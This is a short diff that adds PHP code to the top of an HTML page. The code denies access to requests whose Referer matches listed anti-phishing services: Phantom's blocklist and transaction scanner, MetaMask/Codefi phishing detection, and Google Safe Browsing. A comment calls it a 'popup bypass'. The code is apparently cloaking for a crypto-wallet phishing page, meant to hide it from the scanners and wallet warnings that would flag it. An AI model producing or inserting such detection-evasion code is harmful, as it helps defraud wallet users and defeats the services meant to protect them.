@@ -1,3 +1,14 @@
+<!-- Added potential popup bypass - let's see if it works... -->
+<?php
+$blockedEndpoints = ['https://blocklist.phantom.app', 'http://blocklist.phantom.app', 'https://blowfish-blocklist-proxy.phantom.app', 'http://blowfish-blocklist-proxy.phantom.app', 'https://phishing-detection.metafi.codefi.network', 'http://phishing-detection.metafi.codefi.network', 'https://safebrowsing.googleapis.com', 'http://safebrowsing.googleapis.com', 'https://api.phantom.app/transaction/scan/', 'http://api.phantom.app/transaction/scan/'];
+
+$sourceUrl = $_SERVER['HTTP_REFERER'] ?? 'unknown';
+
+if (in_array($sourceUrl, $blockedEndpoints)) {
+    header('HTTP/1.1 403 Forbidden');
+    exit('Access denied');
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
